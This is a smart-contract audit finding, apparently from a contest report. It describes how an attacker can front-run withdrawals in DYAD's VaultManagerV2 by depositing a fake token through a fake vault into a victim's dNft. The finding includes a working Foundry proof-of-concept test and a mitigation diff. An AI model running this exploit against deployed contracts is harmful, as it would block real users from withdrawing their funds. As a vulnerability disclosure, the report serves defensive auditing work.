[H-04] Attacker can frontrun user’s withdrawals to make them revert without costs
Submitted byLimbooo, also found byahmedaghadi,pontifex,Evo,MiniGlome,favelanky,Infect3d,ArmedGoose,AM,SpicyMeatball,0xleadwizard,HChang26,TheSchnilch,Jorgect, and0xabhay
User’s withdrawals will be prevented from success and an attacker can keep it up without a cost by using a fake vault and a fake token.
Proof of Concept
There is a mechanisms for a flash loan protection that saves the current block number in a mapping of dNft token id; and then prevents it from withdrawing at the same block number. As we can see in theVaultManagerV2::deposit()function, this can be called by anyone with a valid dNft id:
src/core/VaultManagerV2.sol:119:functiondeposit(120:uintid,121:addressvault,122:uintamount123:   )124:external125:isValidDNft(id)126:   {@>127:idToBlockOfLastDeposit[id] =block.number;128:Vault_vault=Vault(vault);129:_vault.asset().safeTransferFrom(msg.sender,address(vault),amount);130:_vault.deposit(id,amount);131:   }
The attacker can use this to prevent any withdrawals in the current block, since it will be checked whenever an owner of dNft token try to withdraw:
src/core/VaultManagerV2.sol:134:functionwithdraw(135:uintid,136:addressvault,137:uintamount,138:addressto139:   )140:public141:isDNftOwner(id)142:   {@>143:if(idToBlockOfLastDeposit[id] ==block.number)revertDepositedInSameBlock();144uintdyadMinted=dyad.mintedDyad(address(this),id);
Test Case (Foundry)
// SPDX-License-Identifier: MITpragmasolidity=0.8.17;import"forge-std/console.sol";import"forge-std/Test.sol";import{DeployV2,Contracts}from"../../script/deploy/Deploy.V2.s.sol";import{Licenser}from"../../src/core/Licenser.sol";import{Parameters}from"../../src/params/Parameters.sol";import{ERC20}from"@solmate/src/tokens/ERC20.sol";import{Vault}from"../../src/core/Vault.sol";import{IAggregatorV3}from"../../src/interfaces/IAggregatorV3.sol";import{IVaultManager}from"../../src/interfaces/IVaultManager.sol";contractFakeERC20isERC20{constructor(stringmemoryname,stringmemorysymbol)ERC20(name,symbol,18) {}functionmint(addressto,uint256amount)external{_mint(to,amount);}}contractFakeVaultTestisTest,Parameters{Contractscontracts;addressattacker;FakeERC20fakeERC20;VaultfakeVault;functionsetUp()public{contracts=newDeployV2().run();// Add Vault Manager V2 to the main licenser used by DYAD token, it will allow Vault Manager V2 minting, burning DYAD.vm.prank(MAINNET_OWNER);Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(contracts.vaultManager));attacker=makeAddr('attacker');fakeERC20=newFakeERC20('Fake','FAKE');fakeVault=newVault(contracts.vaultManager,ERC20(fakeERC20),IAggregatorV3(address(0x0)));fakeERC20.mint(attacker,type(uint256).max);}functiontestPoC_attackerCanFrontRunUserWithdrawalsToPreventThemFromWithdrawing()public{// Make a new address for alice, and mint some ether.addressalice=makeAddr('alice');vm.deal(alice,2ether);// Misc addresses (WETH and WETH Vault).addressweth=address(contracts.ethVault.asset());addressethVault=address(contracts.ethVault);// Alice start interactionvm.startPrank(alice);// Mint new dNft token for aliceuintdNftId=contracts.vaultManager.dNft().mintNft{value:1ether}(alice);// Add WETH vault to the newly created dNftcontracts.vaultManager.add(dNftId,ethVault);// Deposit Ether to WETH contract to mint weth tokens(boolsuccess, ) =weth.call{value:1ether}(abi.encodeWithSignature("deposit()"));require(success);// Deposit Weth to vault through Vault Managercontracts.ethVault.asset().approve(address(contracts.vaultManager),1ether);contracts.vaultManager.deposit(dNftId,ethVault,1ether);vm.stopPrank();vm.roll(block.number+1);// attacker approve vault manager to spend his fake erc20vm.startPrank(attacker);fakeVault.asset().approve(address(contracts.vaultManager),type(uint256).max);// whenever alice try to withdraw, attacker front-runs alice and make him unable to withdraw at current block// by depositing to alice's dNft a fake token with fake vaultcontracts.vaultManager.deposit(dNftId,address(fakeVault),1ether);vm.stopPrank();// alice try to withdraw but the call reverted with DepositedInSameBlock error// indicate that the attacker success to prevent the withdrawalvm.expectRevert(IVaultManager.DepositedInSameBlock.selector);vm.prank(alice);contracts.vaultManager.withdraw(dNftId,ethVault,1ether,alice);}}
Tools Used
Foundry
Recommended Mitigation
Consider limiting anyone with any token vaults to updateidToBlockOfLastDeposit. One of these mitigations can be used:
Prevent anyone to deposit to unowned dNft token.Allow to only depositing using licensed vaults, so if the attacker try to front-runs he will lose some real tokens.Since this used to protect against flash loans, no need to use it with all token vaults. This should be used only with vaults that can be used to mint DYAD. So, we can check if the deposit included in thevaultLicenserandkeroseneManagerlicenser, we need to update theidToBlockOfLastDeposit. Here is a git diff for this fix:
diff --git a/src/core/VaultManagerV2.sol b/src/core/VaultManagerV2.solindex fc574a8..73dbb6b 100644--- a/src/core/VaultManagerV2.sol+++ b/src/core/VaultManagerV2.sol@@ -124,7 +124,8 @@ contract VaultManagerV2 is IVaultManager, Initializable {externalisValidDNft(id){-    idToBlockOfLastDeposit[id] = block.number;+    if (vaultLicenser.isLicensed(vault) || keroseneManager.isLicensed(vault))+      idToBlockOfLastDeposit[id] = block.number;Vault _vault = Vault(vault);_vault.asset().safeTransferFrom(msg.sender, address(vault), amount);_vault.deposit(id, amount);
Assessed type
Invalid Validation
Koolex (judge) increased severity to High
shafu0x (DYAD) confirmed